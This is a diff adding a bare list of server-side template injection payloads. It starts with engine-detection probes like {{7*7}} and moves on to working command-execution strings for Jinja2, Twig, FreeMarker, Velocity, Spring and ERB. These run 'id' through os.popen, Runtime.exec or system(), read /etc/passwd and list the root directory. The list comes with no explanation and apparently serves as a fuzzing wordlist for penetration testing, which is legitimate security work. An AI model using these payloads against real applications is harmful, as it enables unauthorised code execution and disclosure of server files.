@@ -1,0 +1,29 @@
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+#set($x=7*7)$x
+{{7*'7'}}
+{{dump(app)}}
+{{config}}
+${T(java.lang.Runtime)}
+*{7*7}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{['id']|filter('system')}}
+{{['id']|map('system')}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{'id'|filter('system')}}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${T(java.lang.Runtime).getRuntime().exec("id")}
+#set($rt=$x.class.forName("java.lang.Runtime"))#set($ex=$rt.getRuntime().exec("id"))
+${product.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
+<%= `id` %>
+<%= system("id") %>
+<%= IO.popen("id").read %>
+<%= File.read("/etc/passwd") %>
+<%= Dir.entries("/") %>
